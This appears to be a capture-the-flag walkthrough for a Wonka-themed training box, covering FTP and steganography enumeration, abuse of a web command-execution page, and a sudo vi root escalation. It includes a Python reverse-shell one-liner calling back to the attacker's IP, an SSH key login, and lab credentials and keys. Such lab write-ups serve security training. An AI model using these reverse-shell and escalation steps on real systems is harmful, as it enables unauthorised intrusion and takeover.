## Target IP: 10.10.59.223

---

### Environment Variables

```bash
export IP=10.10.59.223
export LIP=10.6.24.56
```

---

### Nmap Scan

```bash
sudo nmap -sC -sV -T4 -O $IP -oN nmap_scan.txt
```

**Open Ports:**

| Port | Service | Version |
| --- | --- | --- |
| 21 | FTP | vsftpd 3.0.3 |
| 80 | HTTP | Apache httpd 2.4.29 |
| 100+ | Various | See message below |

**Message on every port above 80:**

```
Small hint from Mr. Wonka: Look somewhere else, it's not here! ;)
Hope you won't drown Augustus
```

=> **Ignore all ports > 80**

---

## FTP Enumeration

```bash
ftp $IP
# Anonymous login: allowed
```

Found file: `gum_room.jpg`

Downloaded it and ran:

```bash
steghide info gum_room.jpg
```

→ Detected embedded file: `b64.txt`

→ No passphrase known, but `gum_room.jpg.out` exists and contains a **base64 dump**

Decoded → **Looks like `/etc/shadow` dump**

→ Only relevant line:

```
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/...:18535:0:99999:7:::
```

---

## Web Enumeration

Visited: `http://$IP`

→ “Squirrel Room” login page

### Gobuster:

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$IP -x txt,html,php -t 50
```

→ Found: `/home.php`

---

## Web Command Execution

Visited: `/home.php`

→ Input box executing system commands

Tried `ls`

→ Found files, served them over webserver, downloaded, nothing useful **except one:**

`validate.php` contains:

```php
$username = "charlie";
$password = "[REDACTED]";
```

---

## Web Login

Logged into `/` with:

- **Username:** charlie
- **Password:** cn7824

Redirected to `/home.php` (same as before)

---

## Shell Access

Set up Netcat listener:

```bash
nc -lvnp 8080
```

Executed reverse shell via web command injection:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.24.56",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

→ Got shell

---

## Privilege Escalation: SSH Access

Found an **RSA private key** in Charlie's home directory

Copied it, set permissions:

```bash
chmod 600 rsa_key
ssh -i rsa_key charlie@$IP
```

→ **No passphrase** required

---

## User Flag

```bash
cat user.txt
# → flag{[REDACTED]}
```

---

## Sudo Privileges

```bash
sudo -l
# (ALL : !root) NOPASSWD: /usr/bin/vi
```

Same as a previous box — **vi bug allows root shell via UID -1 workaround**

```bash
sudo vi
:!/bin/bash
```

```bash
whoami
# → root
```

→ You're now root

---

## Root Flag (Crypto Locked)

Found: `root.py`

→ Asks for **passphrase**

Checked file from earlier: `key_rev_key`

Ran:

```bash
strings key_rev_key
```

Found key:

```
-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
```

Executed script:

```bash
python3 root.py
# Entered key when prompted
```

---

## Final Root Flag

```
flag{[REDACTED]}
```
